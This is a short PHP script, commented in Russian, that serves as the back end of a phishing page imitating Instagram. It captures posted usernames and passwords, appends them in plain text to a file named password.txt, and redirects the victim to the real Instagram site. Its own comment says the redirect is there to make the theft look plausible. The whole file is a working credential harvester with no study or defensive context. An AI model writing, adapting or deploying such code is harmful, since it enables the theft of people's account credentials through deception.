<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Формат записи
    $data = "Username: " . $username . " | Password: " . $password . "\n";

    // Сохранение в файл password.txt
    file_put_contents("password.txt", $data, FILE_APPEND);

    // Перенаправление на Instagram (для правдоподобности)
    header("Location: https://www.instagram.com");
    exit();
}

